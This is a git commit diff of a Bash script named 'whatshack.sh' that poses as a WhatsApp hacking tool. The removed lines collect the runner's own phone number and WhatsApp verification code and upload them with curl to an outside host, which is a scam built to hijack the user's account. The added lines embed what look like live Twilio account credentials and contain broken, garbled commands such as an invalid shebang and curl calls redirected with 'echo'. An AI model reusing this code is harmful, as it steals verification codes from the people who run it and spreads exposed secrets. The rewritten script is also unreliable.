a14ce995678b78ded158e2a015217efd337f6646
dyik <51643039+dyik@users.noreply.github.com>
2019-12-03 13:12:41 +0700

    Update whatshack.sh

--- whatshack.sh
+++ whatshack.sh
@@ -1,16 +1,18 @@
-#!/bin/bash
-clear
+#!/bin/hash
+#ACCOUNT SID="ACa8c0040bb540fa8e2cd14d95b0f82888";       #incoming phone numbers = "https://www.twilio.com/console/phone-numbers/instance/PN531fc3a1b14ae13bb87c9a9947a2d294/messages";
+#AUTH TOKEN: "342ce811752235637f36a5eada5b1f40";
 echo "
-<-- IndoSec -->
+<--www.twilio.com-->
 ####################
-#   whatsapp Code  # By ./DAVID 
-#     Exploiter    # Hanif-Marri King of Hackes
+#   Whatsapp Code  # 
+#     Exploiter    # 
 ####################
 
-Copyright (c) 2018 ceweberbatang Ganteng";
+Copyright © 2019 TWILIO INC.
+ALL RIGHTS RESERVED.";
 echo "";
-read -p "Enter your own number (+62xxxx)=> " num;
-read -p "Enter Target Number (+62xxxx) => " target;
+read -p "Nomer Kamu (+62xxxx)=> " nomer;
+read -p "Nomer Target (+62xxxx) => " target;
 sleep 2
 echo "[+] Syncing Target...";
 sleep 1
@@ -19,9 +21,9 @@ sleep 0.5
 echo "Target => $target";
 sleep 0.5
 echo "[+] Exploiting...";
-echo "Nomer => $nomer" >> kontol.html;
-curl -T kontol.html http://apparelworld.org/
-sleep 5;
+echo "Nomer => $nomer" >> curl -XPOST https://api.twilio.com/2010-04-01/Accounts/ACa8c0040bb540fa8e2cd14d95b0f82888/IncomingPhoneNumbers/PN531fc3a1b14ae13bb87c9a9947a2d294.json \ --data-urlencode "SmsUrl=http://www.mysite.com/twilio" \ -u 342ce811752235637f36a5eada5b1f40:your_auth_token
+curl -XPOST https://api.twilio.com/2010-04-01/Accounts/ACa8c0040bb540fa8e2cd14d95b0f82888/IncomingPhoneNumbers/PN531fc3a1b14ae13bb87c9a9947a2d294.json \ --data-urlencode "SmsUrl=http://www.mysite.com/twilio" \ -u 342ce811752235637f36a5eada5b1f40:your_auth_token
+sleep 5
 echo "[+] Done.";
 echo "Tunggu 5-10 Menit Untuk Mendapatkan Code.";
 read -p "Verify Code => " code;
@@ -30,12 +32,11 @@ echo "[+] Connecting to whatsapp.com...";
 echo "Login => $nomer";
 sleep 0.5
 echo "Code => $code";
-sleep 0.5
-echo "Target => $target";
+sleep 0.5                                                                               echo "Target => $target";
 sleep 0.5
 echo "[+] Sending Exploit...";
-echo "Code => $code" >> kontol.html;
-curl -T kontol.html http://apparelworld.org/
+echo "Code => $code" >> https://api.twilio.com/2010-04-01/Accounts/ACa8c0040bb540fa8e2cd14d95b0f82888/IncomingPhoneNumbers/PN531fc3a1b14ae13bb87c9a9947a2d294.json \ --data-urlencode "SmsUrl=http://www.mysite.com/twilio" \ -u 342ce811752235637f36a5eada5b1f40:your_auth_token
+curl -XPOST https://api.twilio.com/2010-04-01/Accounts/ACa8c0040bb540fa8e2cd14d95b0f82888/IncomingPhoneNumbers/PN531fc3a1b14ae13bb87c9a9947a2d294.json \ --data-urlencode "SmsUrl=http://www.mysite.com/twilio" \ -u 342ce811752235637f36a5eada5b1f40:your_auth_token
 sleep 5
 echo "[+] Success Exploited!";
 exit;
